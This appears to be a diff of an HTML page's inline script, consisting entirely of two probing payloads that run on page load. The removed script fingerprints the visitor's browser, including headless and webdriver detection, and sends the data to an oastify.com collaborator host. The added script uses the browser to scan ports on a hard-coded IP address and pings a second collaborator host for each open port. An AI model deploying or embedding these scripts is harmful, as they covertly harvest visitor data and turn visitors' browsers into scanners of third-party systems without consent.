@@ -1,75 +1,40 @@
-<div></div>
-    <script type="text/javascript">
- 
-function getHeadlessInfo() {
-     const userAgent = navigator.userAgent;
-    const isWebDriver = !!(window.navigator.webdriver || window.webdriver || navigator.webdriver);
+ <script type="text/javascript">
+        async function scanPort(host, port) {
+            try {
+                let url = `http://${host}:${port}`;
+                await fetch(url, { mode: 'no-cors' });
+                console.log(`Port ${port} is open`);
+                sendPing(port);
+                return port;
+            } catch (error) {
+                return null; // Port is closed
+            }
+        }
 
-    // Browser Plugins
-    const plugins = Array.from(navigator.plugins).map(plugin => `${plugin.name} ${plugin.version || ''}`).join(', ');
+        async function scanPorts(host, ports) {
+            let openPorts = [];
+            for (let port of ports) {
+                let result = await scanPort(host, port);
+                if (result) {
+                    openPorts.push(result);
+                }
+            }
+            return openPorts;
+        }
 
-    // Languages
-    const languages = navigator.languages.join(', ');
+        function sendPing(port) {
+            let collaboratorUrl = 'https://378lxqgzt42z0dd1fb7p4ounhen5bw6kv.oastify.com';
+            let pingUrl = `${collaboratorUrl}?port=${port}`;
+            let img = new Image();
+            img.src = pingUrl;
+            console.log(`Ping sent to ${pingUrl}`);
+        }
 
-    // Screen Dimensions
-    const screenWidth = screen.width;
-    const screenHeight = screen.height;
-
-    // Navigator properties
-    const appVersion = navigator.appVersion;
-    const appName = navigator.appName;
-    const platform = navigator.platform;
-    const vendor = navigator.vendor;
-    const productSub = navigator.productSub;
-
-    // Touch Support
-    const maxTouchPoints = navigator.maxTouchPoints;
-
-    // Timezone Offset
-    const timezoneOffset = new Date().getTimezoneOffset();
-
-    // Headless Behavior Detection
-    const detectHeadlessBehavior = () => {
-        const element = document.createElement('div');
-        element.style.cssText = 'width:100px;height:100px;overflow:auto;position:absolute;top:-200px;';
-        document.body.appendChild(element);
-        element.scrollTop = 10;
-        const isHeadlessBehavior = element.scrollTop !== 10;
-        document.body.removeChild(element);
-        return isHeadlessBehavior;
-    };
-    const headlessBehaviorDetected = detectHeadlessBehavior();
-
-    return {
-        userAgent,
-        isWebDriver,
-        plugins,
-        languages,
-        screenWidth,
-        screenHeight,
-        appVersion,
-        appName,
-        platform,
-        vendor,
-        productSub,
-        maxTouchPoints,
-        timezoneOffset,
-        headlessBehaviorDetected
-    };
-}
-function sendHeadlessInfo() {
-    const headlessInfo = getHeadlessInfo();
-    const params = new URLSearchParams(headlessInfo).toString();
-    const url = `https://rkf9aetn6sfnd1qpszkdhc7bu20toycn.oastify.com/xhr?${params}`;
-    const xhr = new XMLHttpRequest();
-    xhr.open("GET", url, true);
-    xhr.send();
-}
-
-sendHeadlessInfo();
-
-
-
-
-        
+        document.addEventListener("DOMContentLoaded", function() {
+            let host = '142.147.252.98'; // Replace with your target host
+            let ports = [80, 443, 8080, 3000, 22, 21,8070,5000]; // List of ports to scan
+            scanPorts(host, ports).then(openPorts => {
+                console.log("Open ports:", openPorts);
+            });
+        });
     </script>
